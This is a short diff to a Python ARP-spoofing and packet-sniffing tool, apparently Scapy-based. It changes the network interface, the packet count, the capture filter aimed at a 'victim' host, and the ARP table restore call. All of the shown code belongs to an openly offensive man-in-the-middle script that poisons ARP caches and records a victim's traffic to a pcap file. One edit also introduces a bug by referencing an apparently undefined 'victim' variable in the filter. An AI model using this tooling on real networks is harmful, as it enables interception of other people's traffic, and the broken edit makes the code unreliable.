@@ -14,7 +14,7 @@ def get_mac(targetip):
 
 
 class Arper():
-    def __init__(self, victim, gateway, interface='en0'):
+    def __init__(self, victim, gateway, interface='eth0'):
         self.victim = victim
         self.victim_mac = get_mac(victim)
         self.gateway = gateway
@@ -72,10 +72,10 @@ class Arper():
             else:
                 time.sleep(2)
 
-    def sniff(self, count=1000):
+    def sniff(self, count=100):
         time.sleep(5)
         print(f'Sniffing {count} packets')
-        bpf_filter = "ip host %s" % self.victim
+        bpf_filter = "ip host %s" %victim
         packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
         wrpcap('arper.pcap', packets)
         print('Got packets')
@@ -86,7 +86,7 @@ class Arper():
     def restore(self):
         print('Restoring ARP tables...')
         send(ARP(
-                op=2,he
+                op=2,
                 psrc=self.gateway,
                 hwsrc=self.gateway_mac,
                 pdst=self.victim,
